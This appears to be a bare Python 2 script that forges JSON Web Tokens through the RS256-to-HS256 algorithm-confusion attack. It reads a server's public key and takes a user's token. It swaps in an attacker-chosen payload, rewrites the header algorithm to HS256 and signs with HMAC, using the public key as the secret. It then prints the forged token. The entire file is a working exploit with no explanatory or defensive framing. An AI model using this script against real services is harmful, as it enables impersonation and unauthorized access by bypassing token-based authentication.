import hmac
import base64
import hashlib
import os
f = open("public.pem")
key = f.read()
jwt = raw_input("Please Enter Your JWT: ")
jwt = jwt.split(".")

header = base64.urlsafe_b64decode(jwt[0]+"==")
payload = base64.urlsafe_b64decode(jwt[1]+"==")

print header
print payload

payload = raw_input("Please Enter New Payload: ")
header = header.replace("RS256", "HS256")

print header
print payload

str =  base64.b64encode(header) + '.' +  base64.b64encode(payload)
str = str.replace("=", "")

sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode("UTF-8").rstrip("=")
print (str+"."+sig)
